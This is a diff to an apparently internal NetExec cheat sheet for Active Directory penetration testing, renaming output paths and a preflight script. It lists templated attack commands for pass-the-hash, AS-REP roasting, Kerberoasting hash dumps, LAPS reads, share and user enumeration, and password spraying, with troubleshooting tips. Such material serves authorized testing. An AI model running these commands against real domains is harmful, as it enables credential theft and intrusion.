@@ -10,7 +10,7 @@ Do not use for: forging tickets, RBCD writes, ESC1 req, interactive SQL. Hand th
 ## Flags that matter
 
 ```
-nxc smb {{CIDR}} --gen-relay-list /loot/enum/relay.txt
+nxc smb {{CIDR}} --gen-relay-list /logs/enum/relay.txt
 nxc smb {{DC}} --pass-pol
 nxc smb {{DC}} -u '' -p '' --users --shares
 nxc smb {{DC}} -u guest -p '' --shares            # null denied but guest binds? use guest
@@ -20,8 +20,8 @@ nxc smb {{DC}} -u {{USER}} -H {{HASH}}            # PTH
 nxc smb {{DC}} -u {{USER}} -H {{HASH}} --local-auth
 nxc smb {{FQDN}} --use-kcache                     # after getTGT
 nxc ldap {{DC}} -u {{USER}} -p '{{PASS}}' --users --groups --computers --trusts
-nxc ldap {{DC}} -u {{USER}} -p '{{PASS}}' --asreproast /loot/hashes/asrep.txt
-nxc ldap {{DC}} -u {{USER}} -p '{{PASS}}' --kerberoasting /loot/hashes/kerb.txt
+nxc ldap {{DC}} -u {{USER}} -p '{{PASS}}' --asreproast /logs/hashes/asrep.txt
+nxc ldap {{DC}} -u {{USER}} -p '{{PASS}}' --kerberoasting /logs/hashes/kerb.txt
 nxc ldap {{DC}} -u {{USER}} -p '{{PASS}}' --trusted-for-delegation
 nxc ldap {{DC}} -u {{USER}} -p '{{PASS}}' -M laps
 nxc smb {{CIDR}} -u {{USER}} -p '{{PASS}}' --sessions --loggedon-users --shares
@@ -56,7 +56,7 @@ nxc mssql|winrm|rdp {{CIDR}} -u {{USER}} -p '{{PASS}}'
 | `STATUS_ACCOUNT_LOCKED_OUT` | stop spray. wait. kerbrute next time |
 | `KDC_ERR_PREAUTH_FAILED` | bad pass, not “Kerberos broken” |
 | `KRB_AP_ERR_SKEW` | `ntpdate -u {{DC}}` |
-| Kerberos/`--kerberoasting` RST on VPN, SMB fine | tun0 path-MTU black-hole — `ip link set dev tun0 mtu 1200` (`/opt/gotad/preflight.sh`) |
+| Kerberos/`--kerberoasting` RST on VPN, SMB fine | tun0 path-MTU black-hole — `ip link set dev tun0 mtu 1200` (`/opt/adtk/preflight.sh`) |
 | `NetBIOSTimeout` on `--rid-brute` over a slow/VPN link | too chatty for ~250ms RTT — pivot to bulk anonymous LDAP (`enum.md`) |
 | LDAP bind fails, SMB works | keep SMB; try `-k` or guest |
 | module missing | `nxc smb --list-modules` then Impacket |
